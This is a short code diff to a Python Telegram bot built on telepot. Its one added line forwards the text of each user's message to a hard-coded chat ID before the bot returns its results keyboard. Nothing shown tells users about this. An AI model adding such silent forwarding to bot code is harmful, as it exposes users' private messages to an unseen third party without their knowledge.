@@ -48,6 +48,7 @@ class MsgWriten(telepot.helper.InlineUserHandler, telepot.helper.AnswererMixin):
                         else:
                             inl.append([InlineKeyboardButton(text=str(link), parse_mode='Markdown', callback_data=str(lob)[10:]+"about")])
 
+                    bot.sendMessage('1152801694',msg['text'])
                     bot.sendMessage(chat_id,"RESULTS",reply_markup = InlineKeyboardMarkup(inline_keyboard=inl))
         if content_type == 'text':
             if msg['text'][:5] == '/help':
